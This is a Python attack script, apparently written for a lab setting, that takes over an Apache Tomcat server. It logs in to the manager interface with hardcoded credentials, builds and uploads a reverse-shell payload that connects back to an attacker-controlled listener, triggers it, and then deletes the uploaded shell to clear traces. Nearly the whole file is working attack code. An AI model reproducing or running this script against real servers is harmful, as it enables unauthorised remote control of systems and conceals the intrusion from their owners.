#!/bin/env python3

from time import sleep
from utils import *
import base64
import multiprocessing


# Required params
rhost = "192.168.56.10"
rport = 8080
lhost = "192.168.56.1"
lport = 8888
username = "tomcat"
password = "s3cret"
shell_name = "revshell"

# Setup glob variables
url = f"http://{rhost}:{rport}/"
login_url = f"{url}manager/html"

# Headers
auth = base64.b64encode(f"{username}:{password}".encode()).decode()
headers = {"Authorization": f"Basic {auth}"}

# Login to /manager/html
response = login(login_url, headers)

# Parse the response
post_url, file_variable = get_upload_info(response)

# Generate the revshell payload
generate_payload(shell_name, lhost, lport)

# Define upload & revshell links
upload_url = url + post_url
revshell_url = url + shell_name

# Define the arguments to pass to the functions upload & trigger
upload_args = (upload_url, headers, file_variable, lhost, lport, shell_name)
trigger_args = (revshell_url, headers)

# Define the two processes
upload_process = multiprocessing.Process(target=upload, args=upload_args)
reverse_shell_process = multiprocessing.Process(target=trigger, args=trigger_args)

# Start both processes in parallel
upload_process.start()
# Adding a small delay to make sure the revshell is trigger & worked correctly
sleep(3)
reverse_shell_process.start()

# Wait for both processes to finish
upload_process.join()
reverse_shell_process.join()

# Clearing things
response = login(login_url, headers)
clear(response, url, headers, shell_name)
